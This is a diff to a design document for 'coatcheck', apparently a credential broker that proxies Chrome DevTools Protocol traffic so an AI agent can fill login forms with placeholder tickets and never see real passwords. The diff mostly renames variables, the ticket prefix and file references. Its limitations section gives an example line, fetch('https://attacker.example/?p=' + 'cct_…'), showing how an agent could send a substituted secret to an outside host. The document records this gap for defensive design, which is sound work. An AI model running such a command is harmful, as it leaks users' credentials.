@@ -1,13 +1,13 @@
 # Browser credential injection via CDP substitution
 
-Status: **implemented (v1)**, behind `CDP_PROXY_ENABLED=1`.
+Status: **implemented (v1)**, behind `COATCHECK_CDP_ENABLED=1`.
 Code: `src/cdp/proxy.ts`, `src/cdp/substitution.ts`, `src/cdp/keystroke-detector.ts`,
-`src/cdp-session-store.ts`, `src/browserbase-rewrite.ts`, wiring in `src/index.ts`,
+`src/cdp-session-store.ts`, `src/browserbase-rewrite.ts`, wiring in `src/mitm.ts` and `src/index.ts`,
 mint endpoint in `src/vault-handler.ts`.
 
 ## Problem
 
-coatcheck's HTTPS path swaps tickets (`tok_*`) for real values in request
+coatcheck's HTTPS path swaps tickets (`cct_*`) for real values in request
 headers and URLs. Logging into a website from a remote browser is different:
 the agent drives the browser with Playwright over a Chrome DevTools Protocol
 (CDP) WebSocket, and the password travels inside a CDP frame such as
@@ -18,7 +18,7 @@ prompt injection.
 CDP injection adds a second listener to coatcheck: a WebSocket proxy that sits
 between the agent's Playwright client and the remote browser. It substitutes
 tickets for real values on outbound CDP frames and redacts real values out of
-inbound frames. The agent fills a login form with `page.fill(sel, "tok_…")`
+inbound frames. The agent fills a login form with `page.fill(sel, "cct_…")`
 and never sees the password.
 
 Scope: ordinary HTML login forms. Sites that require 2FA/OTP at login are out
@@ -45,24 +45,24 @@ of sites.
 ## Architecture
 
 ```
-agent ── HTTPS POST /v1/sessions (x-api-key: tok_…) ──▶ coatcheck :3128 (MITM)
+agent ── HTTPS POST /v1/sessions (x-api-key: cct_…) ──▶ coatcheck :3128 (MITM)
                                                          │ swap ticket → real API key
                                                          │ rewrite response connectUrl
                                                          ▼
                                                     browser vendor REST API
 
 agent ── ws://127.0.0.1:8444/cdp/{sid} ──▶ coatcheck :8444 (CDP proxy)
-                                            │ outbound: tok_* → real value
+                                            │ outbound: cct_* → real value
                                             │ inbound:  real value → [REDACTED:…] or drop
                                             ▼
                                         vendor CDP endpoint (real connectUrl)
 ```
 
 Both listeners run in one process and share the `TokenStore`. The CDP
-listener binds to the same host as the HTTP listener (`PROXY_BIND_HOST`,
-default `127.0.0.1`), port `CDP_PROXY_PORT` (default 8444)
-(`src/index.ts:20`, `src/index.ts:304-313`). If the CDP listener fails to bind,
-the process exits (`src/index.ts:307-309`), so a deployment that gates the agent
+listener binds to the same host as the HTTP listener (`COATCHECK_BIND_HOST`,
+default `127.0.0.1`), port `COATCHECK_CDP_PORT` (default 8444)
+(`src/index.ts`). If the CDP listener fails to bind,
+the process exits (`src/index.ts`), so a deployment that gates the agent
 on broker health also gates it on the CDP listener.
 
 ### Step 1: connectUrl rewrite
@@ -73,7 +73,7 @@ agent received that URL it could connect directly and bypass substitution.
 
 When the CDP proxy is enabled and the CONNECT target is the vendor API host,
 coatcheck replaces the plain response pipe with a streaming rewriter
-(`src/index.ts:184-195`). `createConnectUrlRewriter` (`src/browserbase-rewrite.ts`)
+(`src/mitm.ts`). `createConnectUrlRewriter` (`src/browserbase-rewrite.ts`)
 is a small HTTP/1.1 response parser:
 
 - Frames each response by `Content-Length`, or decodes `Transfer-Encoding:
@@ -87,11 +87,11 @@ is a small HTTP/1.1 response parser:
 The replacement is produced by `CdpSessionStore.register(realConnectUrl)`
 (`src/cdp-session-store.ts:32`), which stores the real URL under a random
 24-hex-char `sid` (12 random bytes) with a 10-minute TTL, and returns
-`ws://{CDP_PROXY_ADVERTISE_HOST}:{CDP_PROXY_PORT}/cdp/{sid}`. The signing key
+`ws://{COATCHECK_CDP_ADVERTISE_HOST}:{COATCHECK_CDP_PORT}/cdp/{sid}`. The signing key
 in the real URL never reaches the agent.
 
 The rewrite only happens on a MITM'd connection. The MITM is only engaged when
-the token store is non-empty at CONNECT time (`src/index.ts:95`); in practice
+the token store is non-empty at CONNECT time (`src/mitm.ts`); in practice
 the session-create request carries the API-key ticket, so the store is
 non-empty.
 
@@ -141,7 +141,7 @@ response, and the listener binds to loopback by default.
 
 `substituteOutbound` (`src/cdp/substitution.ts:33-95`):
 
-- Pre-filter: if the raw frame contains no `tok_` substring, forward it
+- Pre-filter: if the raw frame contains no `cct_` substring, forward it
   untouched without parsing (`:39`). Most CDP traffic skips JSON parsing.
 - Otherwise parse and substitute only in these fields:
 
@@ -155,7 +155,7 @@ Playwright pads `Runtime.callFunctionOn.arguments` with internal entries
 before user arguments (a probe saw the ticket at index 5), so the code walks
 the whole array (`:62-69`).
 
-- A frame of any other method that contains `tok_` is forwarded unmodified and
+- A frame of any other method that contains `cct_` is forwarded unmodified and
   logged as "token observed in unsupported method" (`:87-88`,
   `src/cdp/proxy.ts:123-127`). Deliberately not substituted in v1:
   `Network.setExtraHTTPHeaders`, `Page.addScriptToEvaluateOnNewDocument`,
@@ -234,13 +234,13 @@ session remains the client's job.
 
 | Condition | Behaviour |
 |---|---|
-| `CDP_PROXY_ENABLED` unset | No CDP listener; `connectUrl` not rewritten; agent receives the real vendor URL (`src/index.ts:184`, `:311-313`). Credential injection unavailable. |
-| Token store empty at CONNECT time | Tunnel is passthrough; `connectUrl` not rewritten for that connection (`src/index.ts:95-99`). |
+| `COATCHECK_CDP_ENABLED` unset | No CDP listener; `connectUrl` not rewritten; agent receives the real vendor URL (`src/mitm.ts`, `src/index.ts`). Credential injection unavailable. |
+| Token store empty at CONNECT time | Tunnel is passthrough; `connectUrl` not rewritten for that connection (`src/mitm.ts`). |
 | sid unknown or expired (10 min) | WebSocket closed 1008. |
 | Second concurrent CDP connection | Closed 1013. |
 | Upstream does not open within 10 s | Torn down; session tickets revoked. |
 | >256 frames queued before upstream opens | CDP error to client, torn down. |
-| Ticket expired before use | Literal `tok_…` reaches the page; login fails visibly. |
+| Ticket expired before use | Literal `cct_…` reaches the page; login fails visibly. |
 | `page.type()` with a ticket | Last keystroke frame dropped, CDP error returned. |
 | Real value echoed in an inbound frame that cannot be cleaned | Frame dropped; the awaiting client call stalls. |
 | Ticket in an unsupported CDP method | Forwarded unsubstituted, warning logged. |
@@ -258,7 +258,7 @@ session remains the client's job.
   session-scoping and TTL.
 - **`Runtime.evaluate` can exfiltrate directly.** Because `expression` and
   `functionDeclaration` are substitution sites, an agent can send
-  `fetch('https://attacker.example/?p=' + 'tok_…')` and coatcheck will put the
+  `fetch('https://attacker.example/?p=' + 'cct_…')` and coatcheck will put the
   real value into the expression that runs in the page. The same lack of host
   binding as above; there is no restriction on what the substituted script
   does.
@@ -291,7 +291,7 @@ session remains the client's job.
 The vendor-specific pieces are small:
 
 - the REST host whose responses are rewritten (`BROWSERBASE_API_HOST`,
-  `src/index.ts:26`), and
+  `src/server.ts`), and
 - the response rewriter that finds and replaces the CDP URL
   (`src/browserbase-rewrite.ts`, keyed on the JSON field `connectUrl`).
 
@@ -315,10 +315,10 @@ browser then becomes a new adapter rather than a fork. See `docs/ROADMAP.md`.
 
 | Variable | Default | Meaning |
 |---|---|---|
-| `CDP_PROXY_ENABLED` | off | `1` enables the listener and `connectUrl` rewrite. |
-| `CDP_PROXY_PORT` | `8444` | Listener port. |
-| `CDP_PROXY_ADVERTISE_HOST` | `127.0.0.1` | Host written into rewritten URLs. Override when the client is in a different network namespace (e.g. separate containers in local dev). |
-| `PROXY_BIND_HOST` | `127.0.0.1` | Bind address for both listeners. |
+| `COATCHECK_CDP_ENABLED` | `0` | `1` enables the listener and `connectUrl` rewrite. |
+| `COATCHECK_CDP_PORT` | `8444` | Listener port. |
+| `COATCHECK_CDP_ADVERTISE_HOST` | `127.0.0.1` | Host written into rewritten URLs. Override when the client is in a different network namespace (e.g. separate containers in local dev). |
+| `COATCHECK_BIND_HOST` | `127.0.0.1` | Bind address for both listeners. |
 
 ## Logging
 
